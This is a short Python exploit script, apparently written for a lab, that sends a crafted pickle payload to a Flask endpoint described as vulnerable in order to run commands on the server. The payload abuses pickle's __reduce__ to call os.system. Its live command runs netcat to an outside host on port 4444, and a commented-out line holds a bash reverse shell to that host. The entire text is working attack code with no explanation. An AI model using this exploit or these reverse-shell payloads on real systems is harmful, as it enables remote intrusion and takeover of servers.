#!/usr/bin/python

import pickle
import base64
import requests
import sys

class PickleRCE(object):
    def __reduce__(self):
        import os
        return (os.system,(command,))

url = 'http://127.0.0.1:5000/upload_serial_data'
#command = "whoami; /bin/bash -i >& /dev/tcp/172.26.136.76/4444 0>&1"  # Reverse Shell Payload Change IP/PORT
command = 'whoami;nc 172.26.136.76 4444'

pickled = 'data'  # This is the POST parameter of our vulnerable Flask app
payload = base64.b64encode(pickle.dumps(PickleRCE()))  # Crafting Payload
print(payload)
requests.post(url, data={pickled: payload})  # Sending POST request
